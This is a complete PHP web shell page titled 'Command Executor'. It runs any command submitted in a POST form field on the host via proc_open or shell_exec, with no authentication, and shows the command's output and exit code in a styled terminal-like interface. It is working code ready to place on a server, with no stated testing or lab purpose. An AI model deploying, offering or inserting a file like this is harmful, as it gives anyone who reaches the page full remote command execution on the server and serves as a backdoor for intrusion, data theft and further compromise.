<?php
$cmd = '';
$stdout = '';
$stderr = '';
$exit_code = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cmd = $_POST['cmd'] ?? '';

    try {
        if (function_exists('proc_open')) {
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            $process = @proc_open($cmd, $descriptorspec, $pipes);
            if (is_resource($process)) {
                fclose($pipes[0]);
                $stdout = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                $stderr = stream_get_contents($pipes[2]);
                fclose($pipes[2]);
                $exit_code = proc_close($process);
            } else {
                $stdout = shell_exec($cmd . ' 2>&1');
                $stderr = '';
                $exit_code = 0;
            }
        } else {
            $stdout = shell_exec($cmd . ' 2>&1');
            $stderr = '';
            $exit_code = 0;
        }
    } catch (Throwable $e) {
        $stderr .= "Exception: " . $e->getMessage();
        $exit_code = 1;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Command Executor</title>
<style>
    body { background: #121212; color: #fff; font-family: monospace; display:flex; justify-content:center; padding:50px; }
    .terminal { background: #1e1e1e; padding:20px; border-radius:10px; width:800px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
    input[type="text"] { width: 100%; padding:10px; background:#2e2e2e; border:none; border-radius:5px; color:#fff; font-family: monospace; }
    input[type="submit"] { padding:10px 20px; background:#4CAF50; border:none; border-radius:5px; color:#fff; cursor:pointer; margin-top:10px; }
    details { margin-top:10px; }
    summary { cursor:pointer; font-weight:bold; }
    pre { background:#2e2e2e; padding:10px; border-radius:5px; overflow-x:auto; }
    h3 { margin-bottom:5px; }
</style>
</head>
<body>
<div class="terminal">
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command..." value="<?php echo htmlspecialchars($cmd); ?>" required>
        <input type="submit" value="Run">
    </form>

    <?php if ($cmd !== ''): ?>
        <h3 style="color:#4CAF50;">Command:</h3>
        <pre><?php echo htmlspecialchars($cmd); ?></pre>

        <details open>
            <summary style="color:#2196F3;">STDOUT</summary>
            <pre><?php echo htmlspecialchars($stdout); ?></pre>
        </details>

        <details>
            <summary style="color:#f44336;">STDERR</summary>
            <pre><?php echo htmlspecialchars($stderr); ?></pre>
        </details>

        <h3 style="color:#FFC107;">Exit Code:</h3>
        <pre><?php echo $exit_code; ?></pre>
    <?php endif; ?>
</div>
</body>
</html>
